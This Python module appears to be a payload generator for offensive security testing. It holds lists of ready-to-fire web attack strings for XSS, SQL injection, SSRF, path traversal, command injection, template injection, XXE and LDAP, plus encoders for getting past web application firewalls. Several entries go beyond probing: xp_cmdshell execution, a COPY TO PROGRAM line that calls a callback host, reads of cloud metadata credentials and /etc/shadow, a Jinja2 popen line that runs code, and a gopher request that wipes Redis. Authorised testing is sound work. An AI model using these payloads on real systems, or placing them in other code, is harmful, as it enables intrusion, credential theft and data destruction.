"""Context-aware payload generation for offensive security testing."""

from __future__ import annotations

import base64
from dataclasses import dataclass
from urllib.parse import quote


@dataclass
class Payload:
    value: str
    category: str
    context: str
    detection: str
    severity: str
    description: str


# --- XSS Payloads ---

XSS_BASIC = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
]

XSS_DOM = [
    '#<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    '${alert(1)}',
    '{{alert(1)}}',
]

XSS_WAF_BYPASS = [
    '<Script>alert(1)</Script>',
    '<img/src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<img src=x oneonerrorrror=alert(1)>',
    '<img src=x onerror\t=alert(1)>',
    '<img src=x onerror=alert`1`>',
    '<svg onload=alert(1)//',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
]

# --- SQLi Payloads ---

SQLI_ERROR = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1',
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

SQLI_BLIND = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,SHA1('test'))--",
    "1' AND '1'='1",
    "1' AND '1'='2",
]

SQLI_MYSQL = [
    "' UNION SELECT 1,2,3-- -",
    "' UNION SELECT table_name FROM information_schema.tables-- -",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
]

SQLI_PGSQL = [
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "'; COPY (SELECT '') TO PROGRAM 'nslookup {host}'--",
]

SQLI_MSSQL = [
    "' UNION SELECT 1,2,3--",
    "'; EXEC xp_cmdshell 'whoami'--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]

# --- SSRF Payloads ---

SSRF_LOCALHOST = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://[::ffff:127.0.0.1]",
    "http://0177.0.0.1",
    "http://0x7f000001",
    "http://0.0.0.0",
    "http://127.1",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:8080",
]

SSRF_CLOUD = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
]

SSRF_PROTOCOL = [
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall",
]

# --- Path Traversal ---

PATH_TRAVERSAL_UNIX = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
]

PATH_TRAVERSAL_WIN = [
    "..\\..\\..\\windows\\win.ini",
    "....\\\\....\\\\....\\\\windows\\win.ini",
    "..%5c..%5c..%5cwindows\\win.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
]

# --- Command Injection ---

CMDI_UNIX = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "& id",
    "&& id",
    "|| id",
    "\n id",
    "; sleep 5",
    "| sleep 5",
]

CMDI_WINDOWS = [
    "& whoami",
    "| whoami",
    "&& whoami",
    "|| whoami",
    "& ping -n 5 127.0.0.1",
]

# --- SSTI Payloads ---

SSTI_DETECT = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{config}}",
    "<%= 7*7 %>",
]

SSTI_JINJA2 = [
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
]

SSTI_ERB = [
    "<%= `id` %>",
    "<%= system('id') %>",
]

# --- XXE Payloads ---

XXE_FILE_DISCLOSURE = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
]

XXE_SSRF = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
]

# --- LDAP Injection ---

LDAP_AUTH_BYPASS = [
    "*)(&",
    "*()|%26%26|",
    "admin)(&))",
    "%00admin%00",
]

# --- WAF Bypass Encoding ---

WAF_BYPASS_ENCODINGS = {
    "url_double": lambda p: quote(quote(p, safe=""), safe=""),
    "html_entity": lambda p: "".join(f"&#{ord(c)};" for c in p),
    "base64": lambda p: base64.b64encode(p.encode()).decode(),
    "hex": lambda p: "".join(f"\\x{ord(c):02x}" for c in p),
    "unicode": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
}


class PayloadGenerator:
    """Context-aware payload generator for offensive security testing."""

    def __init__(self, callback_host: str = ""):
        self.callback_host = callback_host

    def get_payloads(
        self,
        category: str,
        context: str = "html",
        include_waf_bypass: bool = True,
        limit: int = 20,
    ) -> list[Payload]:
        raw = self._get_raw_payloads(category)
        payloads: list[Payload] = []
        for p in raw:
            if self.callback_host and "{callback_host}" in p:
                p = p.replace("{callback_host}", self.callback_host)
            payloads.append(Payload(
                value=p, category=category, context=context,
                detection=self._detection_string(category, p),
                severity=self._severity(category),
                description=self._description(category, p),
            ))
            if include_waf_bypass and len(payloads) < limit:
                for name, encoder in WAF_BYPASS_ENCODINGS.items():
                    try:
                        encoded = encoder(p)
                        if encoded != p and len(encoded) < 500:
                            payloads.append(Payload(
                                value=encoded, category=category,
                                context=context, detection=self._detection_string(category, p),
                                severity=self._severity(category),
                                description=f"{self._description(category, p)} (WAF bypass: {name})",
                            ))
                    except Exception:
                        continue
        return payloads[:limit]

    def get_context_payloads(self, param_type: str, context: str = "html") -> list[Payload]:
        payloads: list[Payload] = []
        if param_type in ("text", "search", "query", "string"):
            payloads.extend(self.get_payloads("xss", context, limit=5))
            payloads.extend(self.get_payloads("sqli", context, limit=5))
            payloads.extend(self.get_payloads("ssti", context, limit=3))
        elif param_type in ("url", "link", "href", "src"):
            payloads.extend(self.get_payloads("ssrf", context, limit=5))
            payloads.extend(self.get_payloads("path_traversal", context, limit=3))
        elif param_type in ("file", "upload", "path"):
            payloads.extend(self.get_payloads("path_traversal", context, limit=5))
        elif param_type in ("xml", "soap", "xhtml"):
            payloads.extend(self.get_payloads("xxe", context, limit=3))
        elif param_type in ("username", "login", "user"):
            payloads.extend(self.get_payloads("sqli", context, limit=5))
            payloads.extend(self.get_payloads("ldap", context, limit=3))
        else:
            payloads.extend(self.get_payloads("xss", context, limit=3))
            payloads.extend(self.get_payloads("sqli", context, limit=3))
        return payloads

    def _get_raw_payloads(self, category: str) -> list[str]:
        mapping = {
            "xss": XSS_BASIC + XSS_DOM + XSS_WAF_BYPASS,
            "sqli": SQLI_ERROR + SQLI_BLIND + SQLI_MYSQL + SQLI_PGSQL + SQLI_MSSQL,
            "ssrf": SSRF_LOCALHOST + SSRF_CLOUD + SSRF_PROTOCOL,
            "path_traversal": PATH_TRAVERSAL_UNIX + PATH_TRAVERSAL_WIN,
            "cmdi": CMDI_UNIX + CMDI_WINDOWS,
            "ssti": SSTI_DETECT + SSTI_JINJA2 + SSTI_ERB,
            "xxe": XXE_FILE_DISCLOSURE + XXE_SSRF,
            "ldap": LDAP_AUTH_BYPASS,
        }
        return mapping.get(category, [])

    def _detection_string(self, category: str, payload: str) -> str:
        mapping = {
            "xss": "alert(1)" if "alert(1)" in payload or "alert`1`" in payload else "",
            "sqli": "syntax error" if "'" in payload else "",
            "ssrf": "meta-data" if "meta-data" in payload else "root:" if "passwd" in payload else "",
            "path_traversal": "root:" if "passwd" in payload or "win.ini" in payload else "",
            "cmdi": "uid=" if "id" in payload else "",
            "ssti": "49" if "7*7" in payload else "",
        }
        return mapping.get(category, "")

    def _severity(self, category: str) -> str:
        return {"xss": "high", "sqli": "critical", "ssrf": "high",
                "path_traversal": "high", "cmdi": "critical", "ssti": "critical",
                "xxe": "high", "ldap": "medium"}.get(category, "medium")

    def _description(self, category: str, payload: str) -> str:
        labels = {"xss": "XSS injection", "sqli": "SQL injection", "ssrf": "SSRF",
                  "path_traversal": "Path traversal", "cmdi": "Command injection",
                  "ssti": "Template injection", "xxe": "XXE injection", "ldap": "LDAP injection"}
        return f"{labels.get(category, category)}: {payload[:60]}"